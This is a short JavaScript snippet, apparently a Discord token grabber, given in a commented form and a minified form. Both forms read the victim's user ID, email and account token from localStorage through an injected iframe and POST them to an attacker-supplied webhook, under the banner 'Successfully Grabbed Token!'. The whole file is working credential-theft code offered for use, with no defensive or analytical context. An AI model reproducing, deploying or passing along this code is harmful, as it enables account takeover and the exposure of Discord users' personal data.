// Replace `YOUR_WEBHOOK_URL` with your Webhook URL
// You can also edit the text fields to customise your embed's appearance
let localStorage = document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage;
fetch("YOUR_WEBHOOK_URL", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    content: null,
    embeds: [{
      title: "Successfully Grabbed Token!",
      color: 2067276,
      fields: [{
        name: "User",
        value: `<@!${localStorage.user_id_cache.slice(1,-1)}>`,
        inline: true
      }, {
        name: "Email",
        value: localStorage.email_cache.slice(1,-1),
        inline: true
      }, {
        name: "Token",
        value: localStorage.token.slice(1, -1).replaceAll("-", "-\n")
      }],
      footer: {
        text: "Hacker Pepe v0.0.0",
        icon_url: "https://imgur.com/5Ri5eok.png"
      }
    }],
    username: "Hacker Pepe",
    avatar_url: "https://imgur.com/5Ri5eok.png"
  })
});

// Minified Version
l=document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage;fetch("YOUR_WEBHOOK_URL",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:null,embeds:[{title:"Successfully Grabbed Token!",color:2067276,fields:[{name:"User",value:`<@!${l.user_id_cache.slice(1,-1)}>`,inline:true},{name:"Email",value:l.email_cache.slice(1,-1),inline:true},{name:"Token",value:l.token.slice(1,-1).replaceAll("-","-\n")}],footer:{text:"Hacker Pepe v0.0.0",icon_url:"https://imgur.com/5Ri5eok.png"}}],username:"Hacker Pepe",avatar_url:"https://imgur.com/5Ri5eok.png"})})